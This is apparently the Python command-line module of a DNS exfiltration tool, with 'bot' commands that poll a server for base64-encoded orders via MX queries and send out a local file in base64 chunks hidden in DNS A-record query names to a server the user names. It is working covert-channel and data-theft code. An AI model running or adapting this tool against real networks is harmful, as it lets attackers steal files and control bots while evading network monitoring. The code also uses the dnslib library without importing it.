import click

from dns_exfil.exfiltrators.chunkdownloader.cli import chunk_client

import sys
import base64
import time

@click.command(name='poll')
@click.option('--domain', default='example.com', help='ending domain name')
@click.argument('connect')
def bot_poll(domain, connect):
    while True:
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(domain, dnslib.QTYPE.MX))
        reply = dnslib.DNSRecord.parse(record.send(connect))
        print(base64.b64decode(reply.rr[-1].rdata.get_label().label[0]).decode('utf-8'))
        time.sleep(5)

@click.command(name='append')
@click.option('--domain', default='example.com', help='ending domain name')
@click.option('--chunk_size', help='size in bytes to transfer in each packet', default=30, type=int)
@click.argument('connect')
@click.argument('local_filename')
@click.argument('remote_filename')
def bot_append(domain, chunk_size, connect, local_filename, remote_filename):
    try:
        local_file = open(local_filename, 'r+b')
    except:
        sys.stderr.write('could not open file. Goodbye')
        sys.exit()
    bytes_sent = 0
    while True:
        chunk = local_file.read(chunk_size)
        if not chunk:
            local_file.close()
            sys.exit()
        encoded_message = base64.standard_b64encode(chunk).decode('utf-8')
        query_string = '{em}.{fn}.{d}'.format(em=encoded_message, fn=remote_filename, d=domain)
        record = dnslib.DNSRecord()
        record.add_question(dnslib.DNSQuestion(query_string, dnslib.QTYPE.A))
        record.send(connect)
        bytes_sent += chunk_size
        print('bytes sent: ' + str(bytes_sent), end='\r')
        

@click.group()
def bot():
    pass

@click.group()
def main():
    pass

bot.add_command(bot_poll)
bot.add_command(bot_append)

main.add_command(bot)
main.add_command(chunk_client)
